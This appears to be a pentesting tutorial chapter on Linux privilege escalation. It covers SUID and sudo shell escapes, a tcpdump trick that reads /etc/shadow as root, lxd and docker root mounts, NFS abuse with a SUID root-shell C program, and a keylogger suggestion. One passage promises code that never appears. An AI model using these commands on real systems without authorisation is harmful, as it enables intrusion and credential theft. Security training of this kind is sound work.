# Privilege Escalation

Once we have a limited shell it is useful to escalate that shells privileges. This way it will be easier to hide, read and write any files, and persist between reboots.

In this chapter I am going to go over these common Linux privilege escalation techniques:

* Kernel exploits
* Programs running as root
* Installed software
* Weak/reused/plaintext passwords
* Inside service
* Suid misconfiguration
* Abusing sudo-rights
* World writable scripts invoked by root
* Bad path configuration
* Cronjobs
* Unmounted filesystems

## Enumeration scripts

I have used principally three scripts that are used to enumerate a machine. They are some difference between the scripts, but they output a lot of the same. So test them all out and see which one you like best.

**LinEnum**

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

Here are the options:

```
-k Enter keyword
-e Enter export location
-t Include thorough (lengthy) tests
-r Enter report name
-h Displays this help text
```

**Unix privesc**

[http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)  
Run the script and save the output in a file, and then grep for warning in it.

**Linprivchecker.py**

[https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)

## Privilege Escalation Techniques

### Kernel Exploits

By exploiting vulnerabilities in the Linux Kernel we can sometimes escalate our privileges. What we usually need to know to test if a kernel exploit works is the OS, architecture and kernel version.

Check the following:

OS:

Architecture:

Kernel version:

```
uname -a
cat /proc/version
cat /etc/issue
```

**Search for exploits**

```
site:exploit-db.com kernel version

python linprivchecker.py extended
```

Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.

### Programs running as root

The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.

**Check which processes are running**

```
# Metasploit
ps

# Linux
ps aux
```

**Mysql**

If you find that mysql is running as root and you username and password to log in to the database you can issue the following commands:

```mysql
select sys_exec('whoami');
select sys_eval('whoami');
```

If neither of those work you can use a [User Defined Function/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)

### User Installed Software

Has the user installed some third party software that might be vulnerable? Check it out. If you find anything google it for exploits.

```
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

### Weak/reused/plaintext passwords

* Check file where webserver connect to database \(`config.php` or similar\)
* Check databases for admin passwords that might be reused
* Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

* Check plaintext password

```bash
# Anything interesting the the mail?
/var/spool/mail
```

```
./LinEnum.sh -t -k password
```

### Service only available from inside

It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. These services might be running as root, or they might have vulnerabilities in them. They might be even more vulnerable since the developer or user might be thinking "since it is only accessible for the specific user we don't need to spend that much of security".

Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?

```
# Linux
netstat -anlp
netstat -ano
```

### Suid and Guid Misconfiguration

When a binary with suid permission is run it is run as another user, and therefore with the other users privileges. It could be root, or just another user. If the suid-bit is set on a program that can spawn a shell or in another way be abuse we could use that to escalate our privileges.

For example, these are some programs that can be used to spawn a shell:

```
nmap
vim
less
more
```

If these programs have suid-bit set we can use them to escalate privileges too. For more of these and how to use the see the next section about abusing sudo-rights:

```
nano
cp
mv
find
```

**Find suid and guid files**

```
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null
```

### Abusing sudo-rights

If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.

##### awk

```
awk 'BEGIN {system("/bin/bash")}'
```

##### find

```bash
sudo find / -exec bash -i \;
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
```

##### less

From less you can go into vi, and then into a shell.

```
sudo less /etc/shadow
v
:shell
```

##### more

You need to run more on a file that is bigger than your screen.

```
sudo more /home/pelle/myfile
!/bin/bash
```

##### tcpdump

```
echo $'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

##### vi/vim

```
:shell

:set shell=/bin/bash:shell    
:!bash
```

##### rvim

```
:diffpatch $(sh <&2 >&2) 

:py import os
:py os.system("/bin/bash")
```

[Vim Issue \#1543](https://github.com/vim/vim/issues/1543)

[How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)

### Abusing Excessive Groups

Often you'll find that a user has been made a member of a group that it needn't be a part of.  From this you can abuse this to either leak information or compromise the system in unintended ways.

When first enumerating a group, see what it can access and what special permissions may be afforded it as so:

```
find / -group groupname 2>/dev/null
```

##### adm

The admin group, adm, allows the user to view logs in `/var/log`.  Whilst this is not directly exploitable, it can be used to leak sensitive information, such as user actions, vulnerable applications and any potentially hidden cron-jobs.

##### lxd

If a member of the lxd gorup, the user can use this to escalate to root, and potentially escape any containers it is a member of.

```bash
ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
Creating test 
ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
Device whatever added to test 
ubuntu@ubuntu:~$ lxc start test 
ubuntu@ubuntu:~$ lxc exec test bash
```

By doing this we effectively have root permissions.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.

The [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) is ideal for engagements, as it's no larger than 4MB.

##### docker

In much the same vein as lxd, we can utilise the docker group to get full root privileges.

```
docker run -v /:/mnt/rootfs -i -t chrisfosterelli/rootplease
```

Similarly, we can use the [alpine](https://github.com/gliderlabs/docker-alpine/tree/2127169e2d9dcbb7ae8c7eca599affd2d61b49a7) docker image, if no useable containers are uploaded to the host.

##### disk

The disk group gives the user full access to any block devices contained within `/dev/`.  Since `/dev/sda1` will in general be the global file-system, and the disk group will have full read-write privileges to this device:

```
brw-rw---- 1 root disk 8, 1 Feb  5 13:38 /dev/sda1
```

From this we can use debugfs to enumerate the entire disk with effectively root level privileges.

##### video

The video group controls access to graphical output devices.  The output to screen is stored within the [framebuffer](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt), which can be dumped to disk and converted to an image, using the following [script](https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/):

```perl
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```

```bash
cp /dev/fb0 /tmp/fb0.raw
width=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1)
height=$(cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2)
./raw2png $width $height < /tmp/fb0.raw > /tmp/fb0.png
```

This isn't directly exploitable, but utilized correctly can allow you to view a user with physical access' session and potentially leak information this way.  On modern systems this isn't likely exploitable.

[Alternative Script](ftp://ftp.embeddedarm.com/ts-arm-sbc/ts-7350-linux/samples/bmptoraw.c)

[Debian Recommendations](https://wiki.debian.org/SystemGroups)

### World writable scripts invoked as root

If you find a script that is owned by root but is writable by anyone you can add your own malicious code in that script that will escalate your privileges when the script is run as root. It might be part of a cronjob, or otherwise automatized, or it might be run by hand by a sysadmin. You can also check scripts that are called by these scripts.

```bash
#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

### Bad path configuration

Putting `.` in the path  
If you put a dot in your path you won't have to write `./binary` to be able to execute it. You will be able to execute any script or binary that is in the current directory.

Why do people/sysadmins do this? Because they are lazy and won't want to write `./.`

This explains it  
[https://hackmag.com/security/reach-the-root/](https://hackmag.com/security/reach-the-root/)  
And here  
[http://www.dankalia.com/tutor/01005/0100501004.htm](http://www.dankalia.com/tutor/01005/0100501004.htm)

### Cronjob

With privileges running script that are editable for other users.

Look for anything that is owned by privileged user but writable for you:

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Ocassionally within these cronjobs, certain running programs may have been coded poorly.  It is highly recommended to refer to the bible of Linux wildcard injection: [https://www.defensecode.com/public/DefenseCode\_Unix\_WildCards\_Gone\_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) when checking for issues in cronjobs.

### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
cat /etc/fstab
```

### NFS Share

If you find that a machine has a NFS share you might be able to use that to escalate privileges. Depending on how it is configured.

```
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
```

If that succeeds then you can go to `/tmp/share`. There might be some interesting stuff there. But even if there isn't you might be able to exploit it.

If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.

This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:

```bash
chmod 4777 exploit
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char *argv[] )
{
    setreuid(0, 0);
    printf("ID: %d\n", geteuid());
    execve("/bin/sh", NULL, NULL);
}
```

Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code which just goes overboard.

You could also just generate a binary using msfvenom if desired.

## Steal password through a keylogger

If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.

## Other useful stuff related to privesc

**World writable directories**

```
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```

## References

[http://www.rebootuser.com/?p=1758](http://www.rebootuser.com/?p=1758)

[http://netsec.ws/?p=309](http://netsec.ws/?p=309)

[https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/](https://www.trustwave.com/Resources/SpiderLabs-Blog/My-5-Top-Ways-to-Escalate-Privileges/)

Watch this video!  
[http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams](http://www.irongeek.com/i.php?page=videos/bsidesaugusta2016/its-too-funky-in-here04-linux-privilege-escalation-for-fun-profit-and-all-around-mischief-jake-williams)

[http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections](http://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections)

[https://www.rebootuser.com/?page\_id=1721](https://www.rebootuser.com/?page_id=1721)

